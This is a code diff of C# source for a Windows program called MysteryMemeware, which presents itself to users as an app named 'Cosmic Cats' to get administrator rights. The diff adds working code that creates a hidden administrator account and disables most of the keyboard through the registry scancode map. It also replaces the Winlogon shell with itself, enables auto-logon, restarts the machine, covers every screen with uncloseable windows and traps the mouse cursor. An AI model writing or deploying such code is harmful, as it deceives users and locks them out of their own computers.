@@ -2,180 +2,209 @@
 {
     public static class Program
     {
-        #region Build Settings
-        public const string PasswordCharset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*_-+=`|\\(){}[]:;\"\'<>,.?/";
-        public const string DefaultInstallLocation = "C:\\MysteryMemeware.exe";
-        public const string SettingsRegistryLocation = "SOFTWARE\\MysteryMemeware";
-        public const uint MaximumUsernameRetries = 1000;
-        public const uint MaximumInstallLocationRetries = 10000;
-        public const string DefaultUsername = "MysteryUser";
-        public const bool AllowImmunity = true;
-        public const bool AllowFailSafe = true;
-        public const string AudioEmbeddedResourceName = "MysteryMemeware.Music.wav";
-        public const string ImmunityMessageTitle = "Mystery Immunity Activated.";
-        public const string ImmunityMessageBody = "Your computer is marked as immune to Mystery Memeware and so the program will now be closed.";
-        #endregion
-        //MAP
-        [System.STAThread]
+        //Approved 07/26/2022 1:18am
         public static void Main()
         {
+            //Primary exception handler swallows exceptions to prevent them from being sent to other processes.
+
             try
             {
-                RunImmunityCheck();
+                //Secondary exception handler shows exception messages to the user through win32 popups.
 
-                RunFailSafe();
+                try
+                {
+                    //Start up the failsafe to detect if the user holds down the uninstall key and then uninstall this program.
 
-                if (IsInstalled())
-                {
-                    Run();
+                    RunFailSafe();
+
+                    //If the program is currently installed then start up the installation otherwise if we have administrator then install it and if we do not have administrator then ask for it.
+
+                    if (IsInstalled())
+                    {
+                        Run();
+                    }
+                    else if (IsAdmin())
+                    {
+                        Install();
+                    }
+                    else
+                    {
+                        BegForAdmin();
+                    }
                 }
-                else if (IsAdmin())
+                catch (System.Exception exception)
                 {
-                    Install();
-                }
-                else
-                {
-                    BegForAdmin();
+                    //If an exception occurs display the exception message to the user in a win32 popup.
+
+                    System.Windows.Forms.MessageBox.Show("Execution failed due to exception: \"" + exception.Message + "\".", "Exception Thrown!", System.Windows.Forms.MessageBoxButtons.OK);
                 }
             }
-            catch (System.Exception exception)
+            catch
             {
-                System.Windows.Forms.MessageBox.Show("MysteryMemeware failed due to exception: " + exception.Message, "Mystery Exception Thrown!", System.Windows.Forms.MessageBoxButtons.OK);
+
             }
+
+            //Terminate the process if we reach the end.
 
             System.Diagnostics.Process.GetCurrentProcess().Kill();
         }
-        //MAP
+        //Approved 07/26/2022 1:19am
         public static void RunFailSafe()
         {
             long pressStartTime = 0;
-            System.Diagnostics.Stopwatch stopwatch = new System.Diagnostics.Stopwatch();
 
-            System.Timers.Timer timer = new System.Timers.Timer();
-            timer.AutoReset = true;
-            timer.Interval = 100;
+            System.Diagnostics.Stopwatch failsafeStopwatch = new System.Diagnostics.Stopwatch();
 
-            timer.Elapsed += (object sender, System.Timers.ElapsedEventArgs e) =>
+            System.Timers.Timer failsafeTimer = new System.Timers.Timer();
+            failsafeTimer.AutoReset = true;
+            failsafeTimer.Interval = 100;
+
+            failsafeTimer.Elapsed += (object sender, System.Timers.ElapsedEventArgs e) =>
             {
                 bool escapeDown = GetKeyState(88) < -64;
 
                 if (escapeDown && pressStartTime == 0)
                 {
-                    pressStartTime = stopwatch.ElapsedTicks;
+                    pressStartTime = failsafeStopwatch.ElapsedTicks;
                 }
                 else if (!escapeDown)
                 {
                     pressStartTime = 0;
                 }
 
-                if (stopwatch.ElapsedTicks - pressStartTime >= 50000000 && pressStartTime != 0)
+                if (failsafeStopwatch.ElapsedTicks - pressStartTime >= 50000000 && pressStartTime != 0)
                 {
                     Uninstall();
                 }
             };
 
-            timer.Start();
+            failsafeTimer.Start();
 
-            stopwatch.Start();
+            failsafeStopwatch.Start();
         }
         public static void Run()
         {
-            VolumeModule.SetVolume();
+            //VolumeModule.SetVolume();
             //TaskMGRModule.KillTaskMGR();
             // MouseLockModule.LockMouse();
-            DisplayCoverModule.CoverDisplays();
 
-            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer(typeof(Program).Assembly.GetManifestResourceStream(AudioEmbeddedResourceName));
+            int screenCount = System.Windows.Forms.Screen.AllScreens.Length;
+            for (int screenIndex = 0; screenIndex < screenCount; screenIndex++)
+            {
+
+                int localScreenIndex = screenIndex;
+                System.Threading.Thread thread = new System.Threading.Thread(() =>
+                {
+                    System.Drawing.Image coverImage = System.Drawing.Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.CoverImage.bmp"));
+                    System.Windows.Forms.Form form = new MainForm(localScreenIndex, coverImage);
+                    form.ShowDialog();
+                });
+                thread.Start();
+            }
+
+            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.Music.wav"));
             while (true)
             {
                 soundPlayer.PlaySync();
             }
         }
+        //Approved 07/26/2022 1:09am
         public static void Install()
         {
-            uint InstallID = 0;
-            string InstallLocation = "C:\\MysteryMemeware.exe";
+            //Install to "C:\MysteryMemeware.exe" and rename if path is taken.
 
-            while (true)
+            string installLocation = "C:\\MysteryMemeware.exe";
+
+            for (uint installLocationIndex = 0; installLocationIndex <= 10000; installLocationIndex++)
             {
                 try
                 {
-                    if (InstallID == 0)
+                    if (installLocationIndex == 0)
                     {
-                        InstallLocation = "C:\\MysteryMemeware.exe";
+                        installLocation = "C:\\MysteryMemeware.exe";
                     }
                     else
                     {
-                        InstallLocation = "C:\\MysteryMemeware" + InstallID.ToString() + ".exe";
+                        installLocation = "C:\\MysteryMemeware" + installLocationIndex.ToString() + ".exe";
                     }
 
-                    if (System.IO.File.Exists(InstallLocation))
-                    {
-                        InstallID++;
-                    }
-                    else
-                    {
-                        System.IO.File.Copy(typeof(Program).Assembly.Location, InstallLocation);
+                    System.IO.File.Copy(typeof(Program).Assembly.Location, installLocation);
 
-                        break;
-                    }
+                    break;
                 }
                 catch
                 {
-                    InstallID++;
+
+                }
+
+                if (installLocationIndex == 10000)
+                {
+                    throw new System.Exception("Could not find availible file path to install into.");
                 }
             }
 
+            //Create new local admin user.
+
+            //Randomly generate a 16 character password from the valid password characters.
+
             System.Random RNG = new System.Random((int)System.DateTime.Now.Ticks);
 
-            char[] PasswordChars = new char[12];
+            char[] passwordChars = new char[16] { 'd', 'e', 'f', 'a', 'u', 'l', 't', 'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '0' };
 
-            for (int i = 0; i < PasswordChars.Length; i++)
+            for (int i = 0; i < 16; i++)
             {
-                PasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*_-+=`|\\(){}[]:;\"\'<>,.?/"[RNG.Next(0, 62)];
+                passwordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*_-+=`|\\(){}[]:;\"\'<>,.?/"[RNG.Next(0, 94)];
             }
 
-            string Password = new string(PasswordChars);
+            string password = new string(passwordChars);
 
-            uint UserID = 0;
+            //Create a new administrator user named "MysteryUser" with the password generated above and rename if username is taken.
 
-            string Username = "MysteryUser";
+            string username = "MysteryUser";
 
-            while (true)
+            for (uint usernameIndex = 0; usernameIndex <= 100; usernameIndex++)
             {
                 try
                 {
-                    if (UserID == 0)
+                    if (usernameIndex == 0)
                     {
-                        Username = "MysteryUser";
+                        username = "MysteryUser";
                     }
                     else
                     {
-                        Username = "MysteryUser" + UserID.ToString();
+                        username = "MysteryUser" + usernameIndex.ToString();
                     }
 
-                    System.DirectoryServices.DirectoryEntry AD = new System.DirectoryServices.DirectoryEntry("WinNT://" + System.Environment.MachineName + ",computer");
-                    System.DirectoryServices.DirectoryEntry NewUser = AD.Children.Add(Username, "user");
-                    NewUser.Invoke("SetPassword", new object[] { Password });
-                    NewUser.Invoke("Put", new object[] { "Description", "MysteryMemeware administrator access user." });
-                    NewUser.CommitChanges();
+                    System.DirectoryServices.DirectoryEntry activeDirectory = new System.DirectoryServices.DirectoryEntry("WinNT://" + System.Environment.MachineName + ",computer");
+                    System.DirectoryServices.DirectoryEntry mysteryUser = activeDirectory.Children.Add(username, "user");
+                    mysteryUser.Invoke("SetPassword", new object[] { password });
+                    mysteryUser.Invoke("Put", new object[] { "Description", "MysteryMemeware administrator access user." });
+                    mysteryUser.CommitChanges();
 
-                    System.DirectoryServices.DirectoryEntry grp = AD.Children.Find("Administrators", "group");
-                    if (grp != null)
+                    System.DirectoryServices.DirectoryEntry administratorsGroup = activeDirectory.Children.Find("Administrators", "group");
+                    if (administratorsGroup != null)
                     {
-                        grp.Invoke("Add", new object[] { NewUser.Path.ToString() });
+                        administratorsGroup.Invoke("Add", new object[] { mysteryUser.Path.ToString() });
                     }
 
                     break;
                 }
                 catch
                 {
-                    UserID++;
+
+                }
+
+                if (usernameIndex == 100)
+                {
+                    throw new System.Exception("Could not find availible username to create MysteryUser.");
                 }
             }
 
+            //Open the local machine registry in 64 bit mode for use later.
 
             Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+
+            //Set the users scancode map to a custom scancode map which disables most of the keyboard. For a full list of disabled keys see ATTACKMETHODS.md.
 
             Microsoft.Win32.RegistryKey KeyboardLayout = LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);
 
@@ -187,7 +216,11 @@
             KeyboardLayout.Close();
             KeyboardLayout.Dispose();
 
+            //Open the software registry for use later.
+
             Microsoft.Win32.RegistryKey Software = LocalMachine.CreateSubKey("SOFTWARE", true);
+
+            //Set a registry to disable the privacey experience popup when signing into a new user account.
 
             Microsoft.Win32.RegistryKey OOBE = Software.CreateSubKey("Policies\\Microsoft\\Windows\\OOBE", true);
 
@@ -197,41 +230,55 @@
             OOBE.Close();
             OOBE.Dispose();
 
+            //Open up the winlogon registry for user later.
+
             Microsoft.Win32.RegistryKey WinLogon = Software.CreateSubKey("Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
 
-            WinLogon.SetValue("Shell", InstallLocation);
-            WinLogon.SetValue("DefaultUserName", Username);
-            WinLogon.SetValue("DefaultPassword", Password);
+            //Set a registry to change the users shell to this program so that it runs instantly uppon sign in. 
+            WinLogon.SetValue("Shell", installLocation);
+
+            //Set some registries to automatically sign the user into the the MysteryUser.
+
+            WinLogon.SetValue("DefaultUserName", username);
+            WinLogon.SetValue("DefaultPassword", password);
             WinLogon.SetValue("AutoAdminLogon", 1);
+
+            //Close the winlogon registry since we are now completely done using it.
 
             WinLogon.Flush();
             WinLogon.Close();
             WinLogon.Dispose();
 
+            //Open up the settings registry to store some information about the installation which was just completed.
+
             Microsoft.Win32.RegistryKey MysteryMemeware = Software.CreateSubKey("MysteryMemeware", true);
 
             MysteryMemeware.SetValue("IsInstalled", "true");
-            MysteryMemeware.SetValue("InstallLocation", InstallLocation);
-            MysteryMemeware.SetValue("MysteryUserID", UserID.ToString());
-            MysteryMemeware.SetValue("MysteryUsername", Username);
-            MysteryMemeware.SetValue("MysteryPassword", MysteryMemeware);
+            MysteryMemeware.SetValue("InstallLocation", installLocation);
+            MysteryMemeware.SetValue("MysteryUsername", username);
+            MysteryMemeware.SetValue("MysteryPassword", password);
 
             MysteryMemeware.Flush();
             MysteryMemeware.Close();
             MysteryMemeware.Dispose();
 
+            //Close the software registry since we are now completely done using it.
+
             Software.Flush();
             Software.Close();
             Software.Dispose();
+
+            //Close the local machine registry since we are now completely done using it.
 
             LocalMachine.Flush();
             LocalMachine.Close();
             LocalMachine.Dispose();
 
-            WinLogOffModule.Restart();
+            //Restart the users computer to finalize the installation process.
 
-            System.Diagnostics.Process.GetCurrentProcess().Kill();
+            WinLogOffModule.Restart();
         }
+        //Approved 07/26/2022 1:17am
         public static void BegForAdmin()
         {
             if (System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.No)
@@ -239,7 +286,7 @@
                 return;
             }
 
-            if (System.Windows.Forms.MessageBox.Show("Administrator access is required in order to install Cosmic Cats. Please select yes on the following popup to grant administrator, or you may select no to cancel the installation.", "Administrator Access Requested.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
+            if (System.Windows.Forms.MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
             {
                 return;
             }
@@ -258,7 +305,7 @@
                 {
                     throw ex;
                 }
-                System.Windows.Forms.MessageBox.Show("Administrator access was denied and therefore Cosmic Cats could not be installed.", "Insufficient Permissions.", System.Windows.Forms.MessageBoxButtons.OK);
+                System.Windows.Forms.MessageBox.Show("Elevated access was denied and therefore Cosmic Cats could not be installed.", "Elevated Access Denied.", System.Windows.Forms.MessageBoxButtons.OK);
             }
         }
         public static void Uninstall()
@@ -414,84 +461,147 @@
 
             System.Diagnostics.Process.GetCurrentProcess().Kill();
         }
-        public static void RunImmunityCheck()
-        {
-            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
-
-            Microsoft.Win32.RegistryKey mysteryMemeware = LocalMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
-
-            if (mysteryMemeware is null)
-            {
-                return;
-            }
-
-            object isImmune = mysteryMemeware.GetValue("IsImmune");
-
-            mysteryMemeware.Close();
-            mysteryMemeware.Dispose();
-
-            LocalMachine.Close();
-            LocalMachine.Dispose();
-
-            if (isImmune is null)
-            {
-                return;
-            }
-
-            if (isImmune.GetType() != typeof(string))
-            {
-                return;
-            }
-
-            string isInstalledString = (string)isImmune;
-
-            if (isInstalledString.ToLower() == "true" && AllowImmunity)
-            {
-                System.Windows.Forms.MessageBox.Show("Your computer is marked as immune to MysteryMemeware and so the program has been closed.", "Mystery Immunity Invoked!", System.Windows.Forms.MessageBoxButtons.OK);
-
-                System.Diagnostics.Process.GetCurrentProcess().Kill();
-            }
-        }
+        //Approved 07/26/2022 1:35am
         public static bool IsInstalled()
         {
-            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
-
-            Microsoft.Win32.RegistryKey mysteryMemeware = LocalMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
-
-            if (mysteryMemeware is null)
+            try
             {
+                //Open up the settings registry and checks the value of "IsInstalled" to see if it matchs a number of variations to the string "true".
+
+                Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+
+                Microsoft.Win32.RegistryKey mysteryMemeware = LocalMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
+
+                string isInstalled = (string)mysteryMemeware.GetValue("IsInstalled");
+
+                mysteryMemeware.Close();
+                mysteryMemeware.Dispose();
+
+                LocalMachine.Close();
+                LocalMachine.Dispose();
+
+                isInstalled = isInstalled.ToLower();
+
+                if (isInstalled == "1" || isInstalled == "true" || isInstalled == "yes" || isInstalled == "y")
+                {
+                    return true;
+                }
+
                 return false;
             }
-
-            object isInstalled = mysteryMemeware.GetValue("IsInstalled");
-
-            mysteryMemeware.Close();
-            mysteryMemeware.Dispose();
-
-            LocalMachine.Close();
-            LocalMachine.Dispose();
-
-            if (isInstalled is null)
+            catch
             {
+                //If something goes wrong then it is safest to assume that the program is not installed and try to install it again.
+
                 return false;
             }
-
-            if (isInstalled.GetType() != typeof(string))
-            {
-                return false;
-            }
-
-            string isInstalledString = (string)isInstalled;
-
-            return isInstalledString.ToLower() == "true";
         }
+        //Approved 07/26/2022 1:37am
         public static bool IsAdmin()
         {
-            System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
-            System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
-            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+            //Checks weather the current process is running as administrator or not.
+
+            try
+            {
+                System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+                System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
+                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+            }
+            catch
+            {
+                //If something went wrong then it is safest to assume we are not yet running as administrator.
+
+                return false;
+            }
         }
+
         [System.Runtime.InteropServices.DllImport("USER32.dll")]
         private static extern short GetKeyState(int virtualKeyID);
+        private sealed class MainForm : System.Windows.Forms.Form
+        {
+            public MainForm(int screenID, System.Drawing.Image coverImage)
+            {
+                this.BackColor = System.Drawing.Color.White;
+
+                this.ShowInTaskbar = false;
+
+                this.TopMost = true;
+                this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+
+                this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
+
+                System.Windows.Forms.Screen screen = System.Windows.Forms.Screen.AllScreens[screenID];
+
+                this.Location = screen.Bounds.Location;
+                this.Width = screen.Bounds.Width;
+                this.Height = screen.Bounds.Height;
+
+                CustomPictureBox pictureBox = new CustomPictureBox();
+
+                double targetAspectRatio = coverImage.Width / (double)coverImage.Height;
+
+                double viewPortWidth = screen.Bounds.Width;
+                double viewPortHeight = screen.Bounds.Height;
+
+                double renderWidth = viewPortHeight * targetAspectRatio;
+                double renderHeight = viewPortWidth / targetAspectRatio;
+
+                if (renderWidth > viewPortWidth)
+                {
+                    renderWidth = viewPortWidth;
+                }
+                if (renderHeight > viewPortHeight)
+                {
+                    renderHeight = viewPortHeight;
+                }
+
+                double renderX = (viewPortWidth - renderWidth) / 2;
+                double renderY = (viewPortHeight - renderHeight) / 2;
+
+                pictureBox.Location = new System.Drawing.Point((int)renderX, (int)renderY);
+                pictureBox.Width = (int)renderWidth;
+                pictureBox.Height = (int)renderHeight;
+
+                pictureBox.Image = coverImage;
+                pictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+
+                this.Controls.Add(pictureBox);
+
+                this.FormClosing += OnFormClosing;
+
+                this.Load += OnFormLoad;
+
+                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
+                this.TopMost = true;
+            }
+
+            private void OnFormLoad(object sender, System.EventArgs e)
+            {
+                System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
+                timer.Tick += OnTimerTick;
+                timer.Interval = 1000;
+                timer.Start();
+
+                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
+                this.TopMost = true;
+            }
+            private void OnTimerTick(object sender, System.EventArgs e)
+            {
+                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
+                this.TopMost = true;
+            }
+            private void OnFormClosing(object sender, System.Windows.Forms.FormClosingEventArgs e)
+            {
+                e.Cancel = true;
+            }
+            private sealed class CustomPictureBox : System.Windows.Forms.PictureBox
+            {
+                protected override void OnPaint(System.Windows.Forms.PaintEventArgs paintEventArgs)
+                {
+                    paintEventArgs.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
+                    base.OnPaint(paintEventArgs);
+                }
+            }
+        }
     }
 }
